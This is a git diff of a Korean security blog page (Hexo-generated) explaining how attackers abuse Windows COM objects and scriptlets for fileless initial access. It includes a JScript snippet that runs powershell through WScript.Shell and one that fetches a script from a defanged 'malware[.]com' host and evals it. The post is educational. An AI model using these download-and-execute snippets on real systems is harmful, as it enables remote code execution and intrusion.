@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      204 자
+      409 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      8
        분
     </span>
   
@@ -244,23 +244,23 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Windows</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 몇 년간, 해커들은 COM Object을 통해 fileless attack, defense 우회, 화이트리스트를 우회하고 RPC 프로토콜을 사용하여 내부에 침투하기도 했습니다. 해커들이 COM 객체를 통해 공격을 진행하는 방법은 다음과 같습니다.</p>
-<p>먼저 Initial Access를 위한 COM 객체를 생성합니다. 내부 네트워크에 접근하기 위해서 페이로드를 전송할 수 있어야 합니다. COM Scriptlet을 통해 악성 자바스크립트나 VBScript를 다운로드하고 실행할 수 있습니다.</p>
-<p>COM을 활용하여 악성 스크립트를 다운로드하고 실행하는 Scriptlet 코드는 다음과 같이 구성됩니다. 첫번째로 Shell에 접근합니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC9C0;&#xB09C; &#xBA87; &#xB144;&#xAC04;, &#xD574;&#xCEE4;&#xB4E4;&#xC740; COM Object&#xC744; &#xD1B5;&#xD574; fileless attack, defense &#xC6B0;&#xD68C;, &#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; RPC &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80;&#xC5D0; &#xCE68;&#xD22C;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB4E4;&#xC774; COM &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xBA3C;&#xC800; Initial Access&#xB97C; &#xC704;&#xD55C; COM &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. COM Scriptlet&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB098; VBScript&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>COM&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; Scriptlet &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8;&#xB85C; Shell&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>
 &lt;![CDATA[
 <span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>
 ]]&gt;
 <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 
-<p><code>ActiveXObject</code>를 통해 <code>WScript.Shell</code>을 호출하여 명령을 실행할 수 있습니다.  그 다음 네트워크 통신을 통해 악성 스크립트 파일을 다운로드하고 실행합니다.</p>
+<p><code>ActiveXObject</code>&#xB97C; &#xD1B5;&#xD574; <code>WScript.Shell</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xADF8; &#xB2E4;&#xC74C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);
 net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);
 net.Send();
 js = net.ResponseText;
 <span class="hljs-built_in">eval</span>(js);</code></pre>
 
-<p>.NET의 Serialization을 활용하여 위의 작업을 수행할 수 있습니다. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>를 <code>ActiveXObject</code>로 호출하면 객체를 base64로 인코딩할 수 있고 메모리에서 디코딩되어 메인 코드를 실행할 수 있습니다. 이는 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>를 통해 쉽게 활용할 수 있습니다.</p>
+<p>.NET&#xC758; Serialization&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC704;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>&#xB97C; <code>ActiveXObject</code>&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xAC1D;&#xCCB4;&#xB97C; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xD560; &#xC218; &#xC788;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xBA54;&#xC778; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>&#xB97C; &#xD1B5;&#xD574; &#xC27D;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -286,9 +286,9 @@ js = net.ResponseText;
                   
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
                   
-                  <a class="hover-with-bg" href="/tags/vbscript/">vbscript</a>
-                  
                   <a class="hover-with-bg" href="/tags/com/">com</a>
+                  
+                  <a class="hover-with-bg" href="/tags/vbscript/">vbscript</a>
                   
                   <a class="hover-with-bg" href="/tags/jscript/">jscript</a>
                   
@@ -567,6 +567,45 @@ js = net.ResponseText;
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
